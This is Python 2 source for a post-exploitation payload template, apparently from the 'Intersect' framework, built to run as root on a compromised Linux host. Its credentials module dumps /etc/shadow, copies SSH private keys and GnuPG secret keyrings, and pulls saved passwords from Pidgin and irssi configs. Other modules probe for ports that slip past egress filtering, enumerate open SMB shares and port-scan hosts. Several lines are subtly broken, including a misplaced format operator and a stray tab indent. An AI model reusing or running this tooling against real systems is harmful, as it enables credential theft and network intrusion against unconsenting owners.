#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
        option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
        pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir


def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)
    sys.exit()

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
        if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def copy2temp(filename, subdir=""):
    if os.path.exists(filename) is True: 
        pass
        if subdir == "" is True:
            shutil.copy2(filename, Temp_Dir)
        else:
            if os.path.exists(Temp_Dir+"/"+subdir) is True:
                subdir = (Temp_Dir+"/"+subdir)
                shutil.copy2(filename, subdir)
            elif os.path.exists(subdir) is True:
                shutil.copy2(filename, subdir)
            else:
                subdir = (Temp_Dir+"/"+subdir)
                os.mkdir(subdir)
                shutil.copy2(filename, subdir)
    else:
        pass

def write2file(filename, text):
    if os.path.exists(filename) is True:
        target = open(filename, "a")
        target.write(text)
        target.close()
    else:
        pass

def writenew(filename, content):
    new = open(filename, "a")
    new.write(content)
    new.close()

def file2file(readfile, writefile):
    if os.path.exists(readfile) is True:
        readfile = open(readfile)
        if os.path.exists(writefile) is True:
            writefile = open(writefile, "a")
            for lines in readfile.readlines():
                writefile.write(lines)
            writefile.close()
            readfile.close()
        else:
            readfile.close()
    else:
        pass
			
def maketemp(subdir):
    moddir = (Temp_Dir+"/"+subdir)
    if os.path.exists(moddir) is False:
        os.mkdir(moddir)
    else:
        pass

def users():
    global userlist
    userlist = []
    passwd = open('/etc/passwd')
    for line in passwd:
        fields = line.split(':')
        uid = int(fields[2])
        if uid > 500 and uid < 32328:
            userlist.append(fields[0])

def combinefiles(newfile, filelist):
    content = ''
    for f in filelist:
        if os.path.exists(f) is True:
            content = content + '\n' + open(f).read()
            open(newfile,'wb').write(content)
        else:
            pass

def tardir(name, directory):
    tar = tarfile.open("%s.tar.gz", "w:gz" % name)
    if os.path.exists(directory) is True:
        tar.add("%s/" % directory)
        print("[+] %s added to %s.tar.gz" % (name, directory))
        tar.close()
    else:
        print("[!] Could not find directory %s " % directory)
        tar.close()

def tarlist(name, filelist):
    tar = tarfile.open("%s.tar.gz" % name, "w:gz")
    for files in filelist:
        if os.path.exists(files) is True:
            tar.add(files)
        else:
            print("[!] %s not found. Skipping.." % files)
    tar.close()

    print("[+] %s.tar.gz file created!" % name)




def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['network', 'creds', 'egressbuster', 'openshares', 'portscan']
    PORT = 8888
    RHOST = ''
    RPORT = 8888
    PPORT = 8080
    PKEY = 'KXYRTUX'
def network():
    '''
    @description: collects network information such as listening ports, DNS info, active connections, firewall rules, etc
    @author: ohdae [bindshell@live.com]
    @short: enumerate network info
    '''
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    maketemp("network")
    networkdir = Temp_Dir+"/network"
    os.chdir(networkdir) 

    proc = Popen('netstat --tcp --listening',
         shell=True,
         stdout=PIPE,
         )
    output = proc.communicate()[0]

    file = open("nstat.txt","a")
    for items in output:
        file.write(items),
    file.close() 

    os.system("lsof -nPi > lsof.txt")
    ports = ["nstat.txt","lsof.txt"]
    combinefiles("Connections.txt", ports)
    os.system("rm nstat.txt lsof.txt")

    if whereis('iptables') is not None:
        os.system("iptables -L -n > iptablesLN.txt") 
        os.system("iptables-save > iptables_save.txt")
    else:
        pass

    os.system("ifconfig -a > ifconfig.txt")


    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
        os.system("hostname -I > IPAddresses.txt")
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
        splitIP = localIP.split('.')
        splitIP[3:] = (['0/24'])
        IPRange = ".".join(splitIP)
        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
        text = ("External IP Address: " + externalIP + "\nInternal IP Address: " + localIP + "\nInternal IP Range: " + IPRange)
        writenew("IPAddresses.txt", text)
   
    os.system("hostname -f > hostname.txt")
   
    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
    combinefiles("NetworkInfo.txt", netfiles)
    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")

    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
    for x in network:
        copy2temp(x, networkdir)
   


def creds():
    '''
    @description: Gather user and system credentials. Looks for passwords, SSH keys, SSL certs, certain application creds, user histories and more.
    @author: ohdae [bindshell@live.com]
    @short: enumerate user and system credentials
    '''
    print("[+] Collecting user and system credentials....")
    maketemp("credentials")
    os.chdir(Temp_Dir+"/credentials/")
    
    os.system('getent passwd > passwd.txt')
    os.system('getent shadow > shadow.txt')
    os.system("lastlog > lastlog.txt")
    os.system("last -a > last.txt")
    os.system("getent aliases > mail_aliases.txt")

    
    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
    os.system("ls /home/*/.ssh/* > ssh_contents.txt")   
    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
    combinefiles("SSH_Locations.txt", sshfiles)
    os.system("rm ssh_locations.txt ssh_contents.txt")
    if os.path.exists(Home_Dir+"/.bash_history") is True:
        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")


    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
    for x in credentials:
        copy2temp(x, "credentials")


	users()
    if whereis('pidgin') is not None:
        for user in userlist:
            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                accts = open("/home/"+user+"/.purple/accounts.xml")
                saved = open("Pidgin.txt", "a")
                for line in accts.readlines():
                    if '<protocol>' in line:
                        saved.write(line)
                    elif '<name>' in line:
                        saved.write(line)
                    elif '<password>' in line:
                        saved.write(line)
                    else:
                        pass
                    
                accts.close()
                saved.close()

    for user in userlist:
        if os.path.exists("/home/"+user+"/.irssi/config") is True:
            accts = open("/home/"+user+"/.irssi/config")
            saved = open("irssi.txt", "a")
            for line in accts.readlines():
                if "password = " in line:
                    saved.write(line)
                else:
                    pass
            accts.close()
            saved.close()

    for user in userlist:
        copy2temp("/home/"+user+"/.znc/configs/znc.conf")
           
            


def egressbuster():
    '''
    @description: Checks a range of ports to find available outbound ports. used to break egress filters.
    @author: original code by David Kennedy aka ReL1K
    @short: finds open outbound ports
    '''
    if len(sys.argv) <=2:
        print("[!] Must specify a port-range!")
        sys.exit()

    portrange = sys.argv[2]
    portrange = portrange.split("-")
    lowport = int(portrange[0])
    highport = int(portrange[1])        
    base_port = int(lowport)-1
    end_port = int(highport)

    print "Sending packets to egress listener..."

    while 1:
        base_port = base_port + 1
        thread.start_new_thread(start_socket, (RHOST,base_port))

        time.sleep(0.02)
        
        if base_port == end_port:
                break

    print "All packets have been sent"


def start_socket(RHOST,base_port):
    try:  
        sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockobj.connect((RHOST, base_port))
        sockobj.send(str(base_port))
        sockobj.close()
    except Exception, e:
        print e
        # pass through, ports closed
        pass



def openshares():
    '''
    @description: Uses smbclient to find open SMB shares on a specified host. Usage: ./Intersect.py --openshares 192.168.1.4
    @author: ohdae [bindshell@live.com]
    @short: find open SMB shares
    '''
    ipaddr = sys.argv[2]

    if whereis('smbclient') is None:
        print("[!] SMBClient cannot be found on this system!")
        sys.exit()

    else:
        print("[+] Enumerating open shares....\n")

        os.popen("/usr/bin/smbclient -L %s -N" % ipaddr)

        getdisks = os.popen(r'/usr/bin/smbclient -L %s -N 2>/dev/null| grep " Disk " | sed -e "s/ Disk .*//" | sed -e "s/^[ \t]*//"' % ipaddr)
        disks = getdisks.readlines()
        disks = filter(None, disks)
        disks = [d.strip() for d in disks]
        getdisks.close()

        for disk in disks:
            proc = Popen('/usr/bin/smbclient //%s/"%s" -N -c "dir;exit" 2>/dev/null'%(ipaddr,disk),
                        shell=True,
                        stdout=PIPE,
                        )
            output = proc.communicate()[0]
            print("[+] Contents of %s " % disk)
            print output		

def portscan():
    '''
    @description: Very simple port scan. Scans ports 1 - 1000 on specified IP. Best used against LAN hosts. Usage: ./Intersect.py -p 192.168.1.4
    @author: ohdae [bindshell@live.com]
    @short: port scanner (-p <ip>)
    '''
    if len(sys.argv) <=2:
        print("[!] Must specify an IP address!")
        Shutdown()
        
    ipaddr = sys.argv[2]    
    print("[+] Starting portscan of: %s " % ipaddr)

    for i in range(1, 1000):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        result = s.connect_ex((ipaddr, i))
        if(result == 0) :
            print("[+] Port open %d " % (i,))
        s.close()
        


def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('    -n    --network        enumerate network info')
    print('    -c    --creds        enumerate user and system credentials')
    print('    -e    --egressbuster        finds open outbound ports')
    print('    -o    --openshares        find open SMB shares')
    print('    -p    --portscan        port scanner (-p <ip>)')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'nceop', ['network', 'creds', 'egressbuster', 'openshares', 'portscan', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-n', '--network'):
            network()
        elif o in ('-c', '--creds'):
            creds()
        elif o in ('-e', '--egressbuster'):
            egressbuster()
        elif o in ('-o', '--openshares'):
            openshares()
        elif o in ('-p', '--portscan'):
            portscan()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])